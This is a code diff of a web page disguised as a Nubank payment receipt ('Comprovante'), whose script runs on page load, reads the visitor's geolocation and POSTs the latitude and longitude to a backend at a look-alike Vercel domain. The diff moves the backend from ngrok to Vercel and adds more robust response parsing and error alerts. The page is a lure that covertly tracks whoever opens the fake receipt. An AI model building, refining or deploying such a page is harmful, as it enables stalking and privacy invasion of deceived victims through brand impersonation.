@@ -6,7 +6,7 @@
 </head>
 <body style="background-color: #6B02A3">
   <img style="display: block; margin: 0 auto;" src="img/Com.jpg" alt="Comprovante" />
-
+  
   <script>
     // Executa automaticamente ao carregar a página
     window.addEventListener("load", () => {
@@ -29,7 +29,7 @@
       console.log("Latitude: " + latitude);
       console.log("Longitude: " + longitude);
 
-      // Envia a localização para o backend (ngrok URL)
+      // Envia a localização para o backend (Vercel URL)
       fetch("https://comprovantenubank-nunegocios.vercel.app/send-location", {
         method: "POST",
         headers: {
@@ -37,22 +37,30 @@
         },
         body: JSON.stringify({ latitude, longitude })
       })
-      .then(response => response.json())
-      .then(data => {
-        if (data.success) {
-          alert("Localização enviada com sucesso!");
-        } else {
-          alert("Erro ao enviar a localização. Tente novamente mais tarde.");
+      .then(response => response.text())  // Lê como texto para evitar erro de JSON malformado
+      .then(text => {
+        console.log("Resposta do servidor: ", text);  // Exibe a resposta do servidor
+        try {
+          const data = JSON.parse(text);  // Tenta converter a resposta para JSON
+          if (data.success) {
+            alert("Localização enviada com sucesso!");
+          } else {
+            alert("Erro ao enviar a localização. Tente novamente mais tarde.");
+          }
+        } catch (error) {
+          console.error("Erro ao tentar parsear a resposta como JSON: ", error);
+          alert("Erro na resposta do servidor.");
         }
       })
       .catch(error => {
         console.error("Erro ao enviar os dados:", error);
+        alert("Erro ao enviar a localização. Tente novamente mais tarde.");
       });
     }
 
     function handleError(error) {
-    console.error("Erro ao obter a localização:", error); // Log do erro completo
-    alert("Erro ao obter a localização. Código do erro: " + error.code + ". Mensagem: " + error.message);
+      console.error("Erro ao obter a localização:", error); // Log do erro completo
+      alert("Erro ao obter a localização. Código do erro: " + error.code + ". Mensagem: " + error.message);
     }
   </script>
 </body>
